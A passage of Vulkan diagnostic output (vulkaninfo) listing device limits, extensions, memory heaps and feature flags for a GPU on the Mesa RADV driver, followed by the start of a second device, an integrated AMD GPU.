	maxTessellationControlPerVertexInputComponents  = 128
	maxTessellationControlPerVertexOutputComponents = 128
	maxTessellationControlPerPatchOutputComponents  = 120
	maxTessellationControlTotalOutputComponents     = 4096
	maxTessellationEvaluationInputComponents        = 128
	maxTessellationEvaluationOutputComponents       = 128
	maxGeometryShaderInvocations                    = 127
	maxGeometryInputComponents                      = 64
	maxGeometryOutputComponents                     = 128
	maxGeometryOutputVertices                       = 256
	maxGeometryTotalOutputComponents                = 1024
	maxFragmentInputComponents                      = 128
	maxFragmentOutputAttachments                    = 8
	maxFragmentDualSrcAttachments                   = 1
	maxFragmentCombinedOutputResources              = 8
	maxComputeSharedMemorySize                      = 32768
	maxComputeWorkGroupCount: count = 3
		65535
		65535
		65535
	maxComputeWorkGroupInvocations                  = 2048
	maxComputeWorkGroupSize: count = 3
		2048
		2048
		2048
	subPixelPrecisionBits                           = 8
	subTexelPrecisionBits                           = 8
	mipmapPrecisionBits                             = 8
	maxDrawIndexedIndexValue                        = 4294967295
	maxDrawIndirectCount                            = 4294967295
	maxSamplerLodBias                               = 16
	maxSamplerAnisotropy                            = 16
	maxViewports                                    = 16
	maxViewportDimensions: count = 2
		16384
		16384
	viewportBoundsRange: count = 2
		-32768
		32767
	viewportSubPixelBits                            = 8
	minMemoryMapAlignment                           = 4096
	minTexelBufferOffsetAlignment                   = 0x00000004
	minUniformBufferOffsetAlignment                 = 0x00000004
	minStorageBufferOffsetAlignment                 = 0x00000004
	minTexelOffset                                  = -32
	maxTexelOffset                                  = 31
	minTexelGatherOffset                            = -32
	maxTexelGatherOffset                            = 31
	minInterpolationOffset                          = -2
	maxInterpolationOffset                          = 2
	subPixelInterpolationOffsetBits                 = 8
	maxFramebufferWidth                             = 16384
	maxFramebufferHeight                            = 16384
	maxFramebufferLayers                            = 1024
	framebufferColorSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	framebufferDepthSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	framebufferStencilSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	framebufferNoAttachmentsSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	maxColorAttachments                             = 8
	sampledImageColorSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	sampledImageIntegerSampleCounts:
		SAMPLE_COUNT_1_BIT
	sampledImageDepthSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	sampledImageStencilSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	storageImageSampleCounts:
		SAMPLE_COUNT_1_BIT
	maxSampleMaskWords                              = 1
	timestampComputeAndGraphics                     = true
	timestampPeriod                                 = 20.8333
	maxClipDistances                                = 8
	maxCullDistances                                = 8
	maxCombinedClipAndCullDistances                 = 8
	discreteQueuePriorities                         = 2
	pointSizeRange: count = 2
		0
		8192
	lineWidthRange: count = 2
		0
		7.99219
	pointSizeGranularity                            = 0.125
	lineWidthGranularity                            = 0.0078125
	strictLines                                     = false
	standardSampleLocations                         = true
	optimalBufferCopyOffsetAlignment                = 0x00000080
	optimalBufferCopyRowPitchAlignment              = 0x00000080
	nonCoherentAtomSize                             = 0x00000040

VkPhysicalDeviceSparseProperties:
---------------------------------
	residencyStandard2DBlockShape            = false
	residencyStandard2DMultisampleBlockShape = false
	residencyStandard3DBlockShape            = false
	residencyAlignedMipSize                  = false
	residencyNonResidentStrict               = false

VkPhysicalDeviceDepthStencilResolvePropertiesKHR:
-------------------------------------------------
	supportedDepthResolveModes:
		RESOLVE_MODE_SAMPLE_ZERO_BIT_KHR
		RESOLVE_MODE_AVERAGE_BIT_KHR
		RESOLVE_MODE_MIN_BIT_KHR
		RESOLVE_MODE_MAX_BIT_KHR
	supportedStencilResolveModes:
		RESOLVE_MODE_SAMPLE_ZERO_BIT_KHR
		RESOLVE_MODE_MIN_BIT_KHR
		RESOLVE_MODE_MAX_BIT_KHR
	independentResolveNone = true
	independentResolve     = true

VkPhysicalDeviceDescriptorIndexingPropertiesEXT:
------------------------------------------------
	maxUpdateAfterBindDescriptorsInAllPools              = 67108863
	shaderUniformBufferArrayNonUniformIndexingNative     = false
	shaderSampledImageArrayNonUniformIndexingNative      = false
	shaderStorageBufferArrayNonUniformIndexingNative     = false
	shaderStorageImageArrayNonUniformIndexingNative      = false
	shaderInputAttachmentArrayNonUniformIndexingNative   = false
	robustBufferAccessUpdateAfterBind                    = false
	quadDivergentImplicitLod                             = false
	maxPerStageDescriptorUpdateAfterBindSamplers         = 8388606
	maxPerStageDescriptorUpdateAfterBindUniformBuffers   = 8388606
	maxPerStageDescriptorUpdateAfterBindStorageBuffers   = 8388606
	maxPerStageDescriptorUpdateAfterBindSampledImages    = 8388606
	maxPerStageDescriptorUpdateAfterBindStorageImages    = 8388606
	maxPerStageDescriptorUpdateAfterBindInputAttachments = 8388606
	maxPerStageUpdateAfterBindResources                  = 8388606
	maxDescriptorSetUpdateAfterBindSamplers              = 8388606
	maxDescriptorSetUpdateAfterBindUniformBuffers        = 8388606
	maxDescriptorSetUpdateAfterBindUniformBuffersDynamic = 16
	maxDescriptorSetUpdateAfterBindStorageBuffers        = 8388606
	maxDescriptorSetUpdateAfterBindStorageBuffersDynamic = 8
	maxDescriptorSetUpdateAfterBindSampledImages         = 8388606
	maxDescriptorSetUpdateAfterBindStorageImages         = 8388606
	maxDescriptorSetUpdateAfterBindInputAttachments      = 8388606

VkPhysicalDeviceDiscardRectanglePropertiesEXT:
----------------------------------------------
	maxDiscardRectangles = 4

VkPhysicalDeviceDriverPropertiesKHR:
------------------------------------
	driverID           = DRIVER_ID_MESA_RADV_KHR
	driverName         = radv
	driverInfo         = Mesa 19.2.3 (LLVM 9.0.0)
	conformanceVersion = 1.1.2.0

VkPhysicalDeviceExternalMemoryHostPropertiesEXT:
------------------------------------------------
	minImportedHostPointerAlignment = 0x00001000

VkPhysicalDeviceIDProperties:
-----------------------------
	deviceUUID      =  0000-00-00-10-000000
	driverUUID      = 414d442d-4d45-5341-2d44-52560000
	deviceNodeMask  = 0
	deviceLUIDValid = false

VkPhysicalDeviceInlineUniformBlockPropertiesEXT:
------------------------------------------------
	maxInlineUniformBlockSize                               = 4194304
	maxPerStageDescriptorInlineUniformBlocks                = 134217728
	maxPerStageDescriptorUpdateAfterBindInlineUniformBlocks = 134217728
	maxDescriptorSetInlineUniformBlocks                     = 64
	maxDescriptorSetUpdateAfterBindInlineUniformBlocks      = 64

VkPhysicalDeviceMaintenance3Properties:
---------------------------------------
	maxPerSetDescriptors    = 22369621
	maxMemoryAllocationSize = 0xffffffff

VkPhysicalDeviceMultiviewProperties:
------------------------------------
	maxMultiviewViewCount     = 8
	maxMultiviewInstanceIndex = 2147483647

VkPhysicalDevicePCIBusInfoPropertiesEXT:
----------------------------------------
	pciDomain   = 0
	pciBus      = 0
	pciDevice   = 1
	pciFunction = 0

VkPhysicalDevicePointClippingProperties:
----------------------------------------
	pointClippingBehavior = POINT_CLIPPING_BEHAVIOR_ALL_CLIP_PLANES

VkPhysicalDeviceProtectedMemoryProperties:
------------------------------------------
	protectedNoFault = false

VkPhysicalDevicePushDescriptorPropertiesKHR:
--------------------------------------------
	maxPushDescriptors = 32

VkPhysicalDeviceSampleLocationsPropertiesEXT:
---------------------------------------------
	sampleLocationSampleCounts:
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	maxSampleLocationGridSize:
		width  = 2
		height = 2
	sampleLocationCoordinateRange: count = 2
		0
		0.9375
	sampleLocationSubPixelBits       = 4
	variableSampleLocations          = false

VkPhysicalDeviceSamplerFilterMinmaxPropertiesEXT:
-------------------------------------------------
	filterMinmaxSingleComponentFormats = true
	filterMinmaxImageComponentMapping  = false

VkPhysicalDeviceSubgroupProperties:
-----------------------------------
	subgroupSize              = 64
	supportedStages:
		SHADER_STAGE_VERTEX_BIT
		SHADER_STAGE_TESSELLATION_CONTROL_BIT
		SHADER_STAGE_TESSELLATION_EVALUATION_BIT
		SHADER_STAGE_GEOMETRY_BIT
		SHADER_STAGE_FRAGMENT_BIT
		SHADER_STAGE_COMPUTE_BIT
		SHADER_STAGE_ALL_GRAPHICS
		SHADER_STAGE_ALL
		SHADER_STAGE_RAYGEN_BIT_NV
		SHADER_STAGE_ANY_HIT_BIT_NV
		SHADER_STAGE_CLOSEST_HIT_BIT_NV
		SHADER_STAGE_MISS_BIT_NV
		SHADER_STAGE_INTERSECTION_BIT_NV
		SHADER_STAGE_CALLABLE_BIT_NV
		SHADER_STAGE_TASK_BIT_NV
		SHADER_STAGE_MESH_BIT_NV
	supportedOperations:
		SUBGROUP_FEATURE_BASIC_BIT
		SUBGROUP_FEATURE_VOTE_BIT
		SUBGROUP_FEATURE_BALLOT_BIT
		SUBGROUP_FEATURE_QUAD_BIT
	quadOperationsInAllStages = true

VkPhysicalDeviceTransformFeedbackPropertiesEXT:
-----------------------------------------------
	maxTransformFeedbackStreams                = 4
	maxTransformFeedbackBuffers                = 4
	maxTransformFeedbackBufferSize             = 0xffffffff
	maxTransformFeedbackStreamDataSize         = 512
	maxTransformFeedbackBufferDataSize         = 4294967295
	maxTransformFeedbackBufferDataStride       = 512
	transformFeedbackQueries                   = true
	transformFeedbackStreamsLinesTriangles     = true
	transformFeedbackRasterizationStreamSelect = false
	transformFeedbackDraw                      = true

VkPhysicalDeviceVertexAttributeDivisorPropertiesEXT:
----------------------------------------------------
	maxVertexAttribDivisor = 4294967295


Device Extensions: count = 71
	VK_AMD_buffer_marker                  : extension revision 1
	VK_AMD_draw_indirect_count            : extension revision 1
	VK_AMD_gcn_shader                     : extension revision 1
	VK_AMD_shader_core_properties         : extension revision 1
	VK_AMD_shader_info                    : extension revision 1
	VK_AMD_shader_trinary_minmax          : extension revision 1
	VK_EXT_buffer_device_address          : extension revision 1
	VK_EXT_calibrated_timestamps          : extension revision 1
	VK_EXT_conditional_rendering          : extension revision 1
	VK_EXT_depth_clip_enable              : extension revision 1
	VK_EXT_depth_range_unrestricted       : extension revision 1
	VK_EXT_descriptor_indexing            : extension revision 2
	VK_EXT_discard_rectangles             : extension revision 1
	VK_EXT_display_control                : extension revision 1
	VK_EXT_external_memory_dma_buf        : extension revision 1
	VK_EXT_external_memory_host           : extension revision 1
	VK_EXT_global_priority                : extension revision 1
	VK_EXT_host_query_reset               : extension revision 1
	VK_EXT_inline_uniform_block           : extension revision 1
	VK_EXT_memory_budget                  : extension revision 1
	VK_EXT_memory_priority                : extension revision 1
	VK_EXT_pci_bus_info                   : extension revision 2
	VK_EXT_pipeline_creation_feedback     : extension revision 1
	VK_EXT_queue_family_foreign           : extension revision 1
	VK_EXT_sample_locations               : extension revision 1
	VK_EXT_sampler_filter_minmax          : extension revision 1
	VK_EXT_scalar_block_layout            : extension revision 1
	VK_EXT_shader_stencil_export          : extension revision 1
	VK_EXT_shader_subgroup_ballot         : extension revision 1
	VK_EXT_shader_subgroup_vote           : extension revision 1
	VK_EXT_shader_viewport_index_layer    : extension revision 1
	VK_EXT_transform_feedback             : extension revision 1
	VK_EXT_vertex_attribute_divisor       : extension revision 3
	VK_EXT_ycbcr_image_arrays             : extension revision 1
	VK_GOOGLE_decorate_string             : extension revision 1
	VK_GOOGLE_hlsl_functionality1         : extension revision 1
	VK_KHR_16bit_storage                  : extension revision 1
	VK_KHR_bind_memory2                   : extension revision 1
	VK_KHR_create_renderpass2             : extension revision 1
	VK_KHR_dedicated_allocation           : extension revision 1
	VK_KHR_depth_stencil_resolve          : extension revision 1
	VK_KHR_descriptor_update_template     : extension revision 1
	VK_KHR_device_group                   : extension revision 1
	VK_KHR_draw_indirect_count            : extension revision 1
	VK_KHR_driver_properties              : extension revision 1
	VK_KHR_external_fence                 : extension revision 1
	VK_KHR_external_fence_fd              : extension revision 1
	VK_KHR_external_memory                : extension revision 1
	VK_KHR_external_memory_fd             : extension revision 1
	VK_KHR_external_semaphore             : extension revision 1
	VK_KHR_external_semaphore_fd          : extension revision 1
	VK_KHR_get_memory_requirements2       : extension revision 1
	VK_KHR_image_format_list              : extension revision 1
	VK_KHR_imageless_framebuffer          : extension revision 1
	VK_KHR_incremental_present            : extension revision 1
	VK_KHR_maintenance1                   : extension revision 1
	VK_KHR_maintenance2                   : extension revision 1
	VK_KHR_maintenance3                   : extension revision 1
	VK_KHR_multiview                      : extension revision 1
	VK_KHR_pipeline_executable_properties : extension revision 1
	VK_KHR_push_descriptor                : extension revision 1
	VK_KHR_relaxed_block_layout           : extension revision 1
	VK_KHR_sampler_mirror_clamp_to_edge   : extension revision 1
	VK_KHR_sampler_ycbcr_conversion       : extension revision 1
	VK_KHR_shader_atomic_int64            : extension revision 1
	VK_KHR_shader_draw_parameters         : extension revision 1
	VK_KHR_shader_float16_int8            : extension revision 1
	VK_KHR_storage_buffer_storage_class   : extension revision 1
	VK_KHR_swapchain                      : extension revision 68
	VK_KHR_uniform_buffer_standard_layout : extension revision 1
	VK_KHR_variable_pointers              : extension revision 1

VkQueueFamilyProperties[0]:
==========================
	minImageTransferGranularity = (1, 1, 1)
	queueCount                  = 1
	queueFlags                  = QUEUE_GRAPHICS | QUEUE_COMPUTE | QUEUE_TRANSFER | QUEUE_SPARSE_BINDING
	timestampValidBits          = 64
	present support:
		VK_KHR_xcb_surface  = true
		VK_KHR_xlib_surface = true

VkQueueFamilyProperties[1]:
==========================
	minImageTransferGranularity = (1, 1, 1)
	queueCount                  = 4
	queueFlags                  = QUEUE_COMPUTE | QUEUE_TRANSFER | QUEUE_SPARSE_BINDING
	timestampValidBits          = 64
	present support:
		VK_KHR_xcb_surface  = true
		VK_KHR_xlib_surface = true

VkPhysicalDeviceMemoryProperties:
=================================
memoryHeaps: count = 2
	memoryHeaps[0]:
		size   = 1073741824 (0x40000000) (1024.00 MiB)
		budget = 974553088
		usage  = 0
		flags:
			MEMORY_HEAP_DEVICE_LOCAL_BIT
	memoryHeaps[1]:
		size   = 3221225472 (0xc0000000) (3.00 GiB)
		budget = 3205656576
		usage  = 0
		flags:
			MEMORY_HEAP_DEVICE_LOCAL_BIT
memoryTypes: count = 3
	memoryTypes[0]:
		heapIndex     = 0
		propertyFlags = 0x0007:
			MEMORY_PROPERTY_DEVICE_LOCAL_BIT
			MEMORY_PROPERTY_HOST_VISIBLE_BIT
			MEMORY_PROPERTY_HOST_COHERENT_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images
	memoryTypes[1]:
		heapIndex     = 1
		propertyFlags = 0x0007:
			MEMORY_PROPERTY_DEVICE_LOCAL_BIT
			MEMORY_PROPERTY_HOST_VISIBLE_BIT
			MEMORY_PROPERTY_HOST_COHERENT_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images
	memoryTypes[2]:
		heapIndex     = 1
		propertyFlags = 0x000f:
			MEMORY_PROPERTY_DEVICE_LOCAL_BIT
			MEMORY_PROPERTY_HOST_VISIBLE_BIT
			MEMORY_PROPERTY_HOST_COHERENT_BIT
			MEMORY_PROPERTY_HOST_CACHED_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images

VkPhysicalDeviceFeatures:
=========================
	robustBufferAccess                      = true
	fullDrawIndexUint32                     = true
	imageCubeArray                          = true
	independentBlend                        = true
	geometryShader                          = true
	tessellationShader                      = true
	sampleRateShading                       = true
	dualSrcBlend                            = true
	logicOp                                 = true
	multiDrawIndirect                       = true
	drawIndirectFirstInstance               = true
	depthClamp                              = true
	depthBiasClamp                          = true
	fillModeNonSolid                        = true
	depthBounds                             = true
	wideLines                               = true
	largePoints                             = true
	alphaToOne                              = true
	multiViewport                           = true
	samplerAnisotropy                       = true
	textureCompressionETC2                  = false
	textureCompressionASTC_LDR              = false
	textureCompressionBC                    = true
	occlusionQueryPrecise                   = true
	pipelineStatisticsQuery                 = true
	vertexPipelineStoresAndAtomics          = true
	fragmentStoresAndAtomics                = true
	shaderTessellationAndGeometryPointSize  = true
	shaderImageGatherExtended               = true
	shaderStorageImageExtendedFormats       = true
	shaderStorageImageMultisample           = false
	shaderStorageImageReadWithoutFormat     = true
	shaderStorageImageWriteWithoutFormat    = true
	shaderUniformBufferArrayDynamicIndexing = true
	shaderSampledImageArrayDynamicIndexing  = true
	shaderStorageBufferArrayDynamicIndexing = true
	shaderStorageImageArrayDynamicIndexing  = true
	shaderClipDistance                      = true
	shaderCullDistance                      = true
	shaderFloat64                           = true
	shaderInt64                             = true
	shaderInt16                             = false
	shaderResourceResidency                 = false
	shaderResourceMinLod                    = false
	sparseBinding                           = true
	sparseResidencyBuffer                   = false
	sparseResidencyImage2D                  = false
	sparseResidencyImage3D                  = false
	sparseResidency2Samples                 = false
	sparseResidency4Samples                 = false
	sparseResidency8Samples                 = false
	sparseResidency16Samples                = false
	sparseResidencyAliased                  = false
	variableMultisampleRate                 = true
	inheritedQueries                        = true

VkPhysicalDevice16BitStorageFeatures:
-------------------------------------
	storageBuffer16BitAccess           = false
	uniformAndStorageBuffer16BitAccess = false
	storagePushConstant16              = false
	storageInputOutput16               = false

VkPhysicalDeviceBufferDeviceAddressFeaturesEXT:
-----------------------------------------------
	bufferDeviceAddress              = true
	bufferDeviceAddressCaptureReplay = false
	bufferDeviceAddressMultiDevice   = false

VkPhysicalDeviceConditionalRenderingFeaturesEXT:
------------------------------------------------
	conditionalRendering          = true
	inheritedConditionalRendering = false

VkPhysicalDeviceDepthClipEnableFeaturesEXT:
-------------------------------------------
	depthClipEnable = true

VkPhysicalDeviceDescriptorIndexingFeaturesEXT:
----------------------------------------------
	shaderInputAttachmentArrayDynamicIndexing          = true
	shaderUniformTexelBufferArrayDynamicIndexing       = true
	shaderStorageTexelBufferArrayDynamicIndexing       = true
	shaderUniformBufferArrayNonUniformIndexing         = true
	shaderSampledImageArrayNonUniformIndexing          = true
	shaderStorageBufferArrayNonUniformIndexing         = true
	shaderStorageImageArrayNonUniformIndexing          = true
	shaderInputAttachmentArrayNonUniformIndexing       = true
	shaderUniformTexelBufferArrayNonUniformIndexing    = true
	shaderStorageTexelBufferArrayNonUniformIndexing    = true
	descriptorBindingUniformBufferUpdateAfterBind      = true
	descriptorBindingSampledImageUpdateAfterBind       = true
	descriptorBindingStorageImageUpdateAfterBind       = true
	descriptorBindingStorageBufferUpdateAfterBind      = true
	descriptorBindingUniformTexelBufferUpdateAfterBind = true
	descriptorBindingStorageTexelBufferUpdateAfterBind = true
	descriptorBindingUpdateUnusedWhilePending          = true
	descriptorBindingPartiallyBound                    = true
	descriptorBindingVariableDescriptorCount           = true
	runtimeDescriptorArray                             = true

VkPhysicalDeviceHostQueryResetFeaturesEXT:
------------------------------------------
	hostQueryReset = true

VkPhysicalDeviceImagelessFramebufferFeaturesKHR:
------------------------------------------------
	imagelessFramebuffer = true

VkPhysicalDeviceInlineUniformBlockFeaturesEXT:
----------------------------------------------
	inlineUniformBlock                                 = true
	descriptorBindingInlineUniformBlockUpdateAfterBind = true

VkPhysicalDeviceMemoryPriorityFeaturesEXT:
------------------------------------------
	memoryPriority = true

VkPhysicalDeviceMultiviewFeatures:
----------------------------------
	multiview                   = true
	multiviewGeometryShader     = true
	multiviewTessellationShader = true

VkPhysicalDevicePipelineExecutablePropertiesFeaturesKHR:
--------------------------------------------------------
	pipelineExecutableInfo = true

VkPhysicalDeviceProtectedMemoryFeatures:
----------------------------------------
	protectedMemory = false

VkPhysicalDeviceSamplerYcbcrConversionFeatures:
-----------------------------------------------
	samplerYcbcrConversion = true

VkPhysicalDeviceScalarBlockLayoutFeaturesEXT:
---------------------------------------------
	scalarBlockLayout = true

VkPhysicalDeviceShaderAtomicInt64FeaturesKHR:
---------------------------------------------
	shaderBufferInt64Atomics = true
	shaderSharedInt64Atomics = true

VkPhysicalDeviceShaderDrawParametersFeatures:
---------------------------------------------
	shaderDrawParameters = true

VkPhysicalDeviceShaderFloat16Int8FeaturesKHR:
---------------------------------------------
	shaderFloat16 = false
	shaderInt8    = true

VkPhysicalDeviceTransformFeedbackFeaturesEXT:
---------------------------------------------
	transformFeedback = true
	geometryStreams   = true

VkPhysicalDeviceUniformBufferStandardLayoutFeaturesKHR:
-------------------------------------------------------
	uniformBufferStandardLayout = true

VkPhysicalDeviceVariablePointersFeatures:
-----------------------------------------
	variablePointersStorageBuffer = true
	variablePointers              = true

VkPhysicalDeviceVertexAttributeDivisorFeaturesEXT:
--------------------------------------------------
	vertexAttributeInstanceRateDivisor     = true
	vertexAttributeInstanceRateZeroDivisor = true

VkPhysicalDeviceYcbcrImageArraysFeaturesEXT:
--------------------------------------------
	ycbcrImageArrays = true


GPU1:
VkPhysicalDeviceProperties:
---------------------------
	apiVersion     = 4198521 (1.1.121)
	driverVersion  = 8388723 (0x800073)
	vendorID       = 0x1002
	deviceID       = 0x9851
	deviceType     = PHYSICAL_DEVICE_TYPE_INTEGRATED_GPU
	deviceName     = Unknown AMD GPU

VkPhysicalDeviceLimits:
-----------------------
	maxImageDimension1D                             = 16384
	maxImageDimension2D                             = 16384
	maxImageDimension3D                             = 2048
	maxImageDimensionCube                           = 16384
	maxImageArrayLayers                             = 2048
	maxTexelBufferElements                          = 4294967295
	maxUniformBufferRange                           = 4294967295
	maxStorageBufferRange                           = 4294967295
	maxPushConstantsSize                            = 128
	maxMemoryAllocationCount                        = 4294967295
	maxSamplerAllocationCount                       = 1048576
	bufferImageGranularity                          = 0x00000001
	sparseAddressSpaceSize                          = 0xcffe00000
	maxBoundDescriptorSets                          = 32
	maxPerStageDescriptorSamplers                   = 4294967295
	maxPerStageDescriptorUniformBuffers             = 4294967295
	maxPerStageDescriptorStorageBuffers             = 4294967295
	maxPerStageDescriptorSampledImages              = 4294967295
	maxPerStageDescriptorStorageImages              = 4294967295
	maxPerStageDescriptorInputAttachments           = 4294967295
	maxPerStageResources                            = 4294967295
	maxDescriptorSetSamplers                        = 4294967295
	maxDescriptorSetUniformBuffers                  = 4294967295
	maxDescriptorSetUniformBuffersDynamic           = 8
	maxDescriptorSetStorageBuffers                  = 4294967295
	maxDescriptorSetStorageBuffersDynamic           = 8
	maxDescriptorSetSampledImages                   = 4294967295
	maxDescriptorSetStorageImages                   = 4294967295
	maxDescriptorSetInputAttachments                = 4294967295
	maxVertexInputAttributes                        = 64
	maxVertexInputBindings                          = 32
	maxVertexInputAttributeOffset                   = 4294967295
	maxVertexInputBindingStride                     = 16383
	maxVertexOutputComponents                       = 128
	maxTessellationGenerationLevel                  = 64
	maxTessellationPatchSize                        = 32
	maxTessellationControlPerVertexInputComponents  = 128
	maxTessellationControlPerVertexOutputComponents = 128
	maxTessellationControlPerPatchOutputComponents  = 120
	maxTessellationControlTotalOutputComponents     = 4096
	maxTessellationEvaluationInputComponents        = 128
	maxTessellationEvaluationOutputComponents       = 128
	maxGeometryShaderInvocations                    = 127
	maxGeometryInputComponents                      = 128
	maxGeometryOutputComponents                     = 128
	maxGeometryOutputVertices                       = 1024
	maxGeometryTotalOutputComponents                = 16384
	maxFragmentInputComponents                      = 128
	maxFragmentOutputAttachments                    = 8
	maxFragmentDualSrcAttachments                   = 1
	maxFragmentCombinedOutputResources              = 4294967295
	maxComputeSharedMemorySize                      = 32768
	maxComputeWorkGroupCount: count = 3
		65535
		65535
		65535
	maxComputeWorkGroupInvocations                  = 1024
	maxComputeWorkGroupSize: count = 3
		1024
		1024
		1024
	subPixelPrecisionBits                           = 8
	subTexelPrecisionBits                           = 8
	mipmapPrecisionBits                             = 8
	maxDrawIndexedIndexValue                        = 4294967295
	maxDrawIndirectCount                            = 4294967295
	maxSamplerLodBias                               = 15.9961
	maxSamplerAnisotropy                            = 16
	maxViewports                                    = 16
	maxViewportDimensions: count = 2
		16384
		16384
	viewportBoundsRange: count = 2
		-32768
		32767
	viewportSubPixelBits                            = 8
	minMemoryMapAlignment                           = 64
	minTexelBufferOffsetAlignment                   = 0x00000004
	minUniformBufferOffsetAlignment                 = 0x00000010
	minStorageBufferOffsetAlignment                 = 0x00000004
	minTexelOffset                                  = -64
	maxTexelOffset                                  = 63
	minTexelGatherOffset                            = -32
	maxTexelGatherOffset                            = 31
	minInterpolationOffset                          = -2
	maxInterpolationOffset                          = 2
	subPixelInterpolationOffsetBits                 = 8
	maxFramebufferWidth                             = 16384
	maxFramebufferHeight                            = 16384
	maxFramebufferLayers                            = 2048
	framebufferColorSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	framebufferDepthSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	framebufferStencilSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	framebufferNoAttachmentsSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	maxColorAttachments                             = 8
	sampledImageColorSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	sampledImageIntegerSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	sampledImageDepthSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	sampledImageStencilSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	storageImageSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	maxSampleMaskWords                              = 1
	timestampComputeAndGraphics                     = true
	timestampPeriod                                 = 20.8333
	maxClipDistances                                = 8
	maxCullDistances                                = 8
	maxCombinedClipAndCullDistances                 = 8
	discreteQueuePriorities                         = 2
	pointSizeRange: count = 2
		0
		8191.88
	lineWidthRange: count = 2
		0
		8191.88
	pointSizeGranularity                            = 0.125
	lineWidthGranularity                            = 0.125
	strictLines                                     = false
	standardSampleLocations                         = true
	optimalBufferCopyOffsetAlignment                = 0x00000001
	optimalBufferCopyRowPitchAlignment              = 0x00000001
	nonCoherentAtomSize                             = 0x00000080

VkPhysicalDeviceSparseProperties:
---------------------------------
	residencyStandard2DBlockShape            = true
	residencyStandard2DMultisampleBlockShape = false
	residencyStandard3DBlockShape            = false
	residencyAlignedMipSize                  = false
	residencyNonResidentStrict               = true

VkPhysicalDeviceDepthStencilResolvePropertiesKHR:
-------------------------------------------------
	supportedDepthResolveModes:
		RESOLVE_MODE_SAMPLE_ZERO_BIT_KHR
		RESOLVE_MODE_MIN_BIT_KHR
		RESOLVE_MODE_MAX_BIT_KHR
	supportedStencilResolveModes:
		RESOLVE_MODE_SAMPLE_ZERO_BIT_KHR
		RESOLVE_MODE_MIN_BIT_KHR
		RESOLVE_MODE_MAX_BIT_KHR
	independentResolveNone = true
	independentResolve     = true

VkPhysicalDeviceDescriptorIndexingPropertiesEXT:
------------------------------------------------
	maxUpdateAfterBindDescriptorsInAllPools              = 4294967295
	shaderUniformBufferArrayNonUniformIndexingNative     = false
	shaderSampledImageArrayNonUniformIndexingNative      = false
	shaderStorageBufferArrayNonUniformIndexingNative     = false
	shaderStorageImageArrayNonUniformIndexingNative      = false
	shaderInputAttachmentArrayNonUniformIndexingNative   = false
	robustBufferAccessUpdateAfterBind                    = false
	quadDivergentImplicitLod                             = false
	maxPerStageDescriptorUpdateAfterBindSamplers         = 4294967295
	maxPerStageDescriptorUpdateAfterBindUniformBuffers   = 4294967295
	maxPerStageDescriptorUpdateAfterBindStorageBuffers   = 4294967295
	maxPerStageDescriptorUpdateAfterBindSampledImages    = 4294967295
	maxPerStageDescriptorUpdateAfterBindStorageImages    = 4294967295
	maxPerStageDescriptorUpdateAfterBindInputAttachments = 4294967295
	maxPerStageUpdateAfterBindResources                  = 4294967295
	maxDescriptorSetUpdateAfterBindSamplers              = 4294967295
	maxDescriptorSetUpdateAfterBindUniformBuffers        = 4294967295
